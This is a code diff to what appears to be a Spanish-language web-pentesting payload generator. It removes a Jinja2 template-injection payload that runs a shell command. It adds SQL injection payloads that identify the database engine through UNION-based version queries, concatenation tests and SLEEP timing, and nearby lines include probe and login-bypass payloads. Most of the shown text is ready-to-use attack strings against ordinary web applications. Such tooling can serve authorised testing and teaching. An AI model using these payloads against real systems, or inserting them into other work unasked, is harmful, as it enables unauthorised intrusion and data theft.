@@ -4456,9 +4456,6 @@ const WEB_VULNS=[
       {payload:'@(7*7)',        result:'49', engine:'Razor (.NET)'},
       {payload:'#{7*7}',        result:'49', engine:'Ruby / Thymeleaf'},
     ],
-    payloads:[
-      {code:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`, d:'RCE en Jinja2 — ejecuta "id" vía os.popen'},
-    ],
   },
   {
     id:'xss', owasp:'A03', icon:'⚡', name:'XSS (Cross-Site Scripting)', tag:'Injection',
@@ -4566,7 +4563,8 @@ function wvPayloadCard(code, desc){
 
 // ─── Generador SQLi (motor de BD + categorías, blind y enumeración) ───────────
 const SQLI_CATS=[
-  {id:'detect', label:'Detección'},
+  {id:'detect',      label:'Detección'},
+  {id:'fingerprint', label:'¿Qué BD es?'},
   {id:'login',  label:'Bypass login'},
   {id:'union',  label:'UNION'},
   {id:'enum',   label:'Enumeración BD'},
@@ -4587,6 +4585,14 @@ function sqliPayloads(dbms, cat){
       {code:"''",             d:'Dos comillas — si el error desaparece, confirma inyección de cadena'},
       {code:`' AND 1=1${c}`,  d:'Condición verdadera — la app responde con normalidad'},
       {code:`' AND 1=2${c}`,  d:'Condición falsa — si responde distinto, hay inyección'},
+    ];
+    case 'fingerprint': return [
+      {code:"' UNION SELECT @@version-- -",            d:'Si @@version funciona → MySQL o MSSQL (mira el texto que devuelve)'},
+      {code:"' UNION SELECT version()-- -",            d:'Si version() funciona → MySQL o PostgreSQL'},
+      {code:"' UNION SELECT banner FROM v$version-- ",  d:'Si v$version funciona → Oracle'},
+      {code:"' AND '1'||'1'='11",                      d:"Si la concatenación || da '11' → PostgreSQL u Oracle (en MySQL || es OR lógico)"},
+      {code:"' AND '1'+'1'='11",                       d:'Si la concatenación con + da 11 → MSSQL'},
+      {code:"' AND SLEEP(5)-- -",                      d:'Si tarda ~5s → MySQL (SLEEP). MSSQL usa WAITFOR DELAY; PostgreSQL, pg_sleep()'},
     ];
     case 'login': return [
       {code:`' OR 1=1${c}`,   d:'Condición siempre verdadera y comenta el resto de la query'},
@@ -4623,7 +4629,11 @@ function renderSqliGen(){
   const btns=document.getElementById('sqliCatBtns');
   if(btns) btns.innerHTML=SQLI_CATS.map(cat=>`<button class="enum-toggle ${cat.id===_sqliCat?'active':''}" onclick="setSqliCat('${cat.id}')">${esc(cat.label)}</button>`).join('');
   const out=document.getElementById('sqliGenOut');
-  if(out) out.innerHTML=sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+  if(!out) return;
+  const head=_sqliCat==='fingerprint'
+    ? `<div class="enum-note" style="margin-bottom:8px;">Prueba estos para saber el motor. Cuando lo identifiques, selecciónalo arriba en «Motor de BD» y las demás categorías se adaptan a su sintaxis.</div>`
+    : '';
+  out.innerHTML=head+sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
 }
 
 function openWebVuln(id){
